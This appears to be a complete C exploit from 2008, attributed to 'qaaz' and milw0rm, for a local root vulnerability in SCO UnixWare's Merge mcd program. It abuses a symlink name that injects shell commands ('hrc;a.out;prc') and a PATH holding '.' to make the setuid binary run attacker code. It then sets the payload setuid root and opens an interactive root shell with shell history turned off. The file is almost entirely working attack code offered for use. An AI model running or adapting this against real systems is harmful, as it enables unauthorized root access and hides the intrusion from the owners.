/* 04/2008: public release
 * I have'nt seen any advisory on this; possibly still not fixed.
 *
 * SCO UnixWare Merge mcd Local Root Exploit
 * By qaaz
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>

#define TARGET	"/usr/lib/merge/mcd"
#define DIR	"/proc/%d/object", getpid()
#define BIN	"a.out"
#define LNK	"hrc;" BIN ";prc"
#define DEV	"/dev/cdrom/cdrom1"

int	main(int argc, char *argv[])
{
	char		dir[4096], bin[4096];
	char		dev[4096], env[4096];
	pid_t		child;
	struct stat	st;

	if (geteuid() == 0) {
		setuid(geteuid());
		setgid(getegid());
		if (strstr(argv[0], BIN)) {
			umask(0);
			chown(BIN, 0, 3);
			chmod(BIN, 06777);
			kill(getppid(), 15);
			return 0;
		}
		putenv("HISTFILE=/dev/null");
		execl("/bin/sh", "sh", "-i", NULL);
		printf("[-] sh: %s\n", strerror(errno));
		return 1;
	}

	printf("---------------------------------------\n");
	printf(" UnixWare Merge mcd Local Root Exploit\n");
	printf(" By qaaz\n");
	printf("---------------------------------------\n");

	if (access(TARGET, EX_OK) < 0) {
		printf("[-] %s: %s\n", TARGET, strerror(errno));
		return 1;
	}

	if (symlink(DEV, LNK) < 0) {
		printf("[-] %s: %s\n", LNK, strerror(errno));
		return 1;
	}

	sprintf(dir, DIR);
	sprintf(bin, "%s/%s", dir, BIN);

	snprintf(dev, sizeof(dev), "/dev/cdrom/../../%s/%s", getcwd(NULL, 4096), LNK);
	snprintf(env, sizeof(env), "PATH=.:%s", getenv("PATH"));

	if ((child = fork()) == 0) {
		chdir(dir);
		putenv(env);
		execl(TARGET, TARGET, "-u", "-d", dev, NULL);
		printf("[-] %s: %s\n", TARGET, strerror(errno));
		return 1;
	} /*else if (child != -1)
		waitpid(child, NULL, 0);*/

	printf("[*] Waiting for privs...\n");
	while (stat(bin, &st) == 0) {
		if ((st.st_mode & 06777) == 06777) {
			printf("[+] Enjoy\n");
			unlink(LNK);
			execl(bin, "woot", NULL);
			printf("[-] %s: %s\n", bin, strerror(errno));
			return 1;
		}
		sleep(1);
	}
	printf("[-] %s: %s\n", bin, strerror(errno));
	unlink(LNK);
	return 0;
}

// milw0rm.com [2008-04-04]
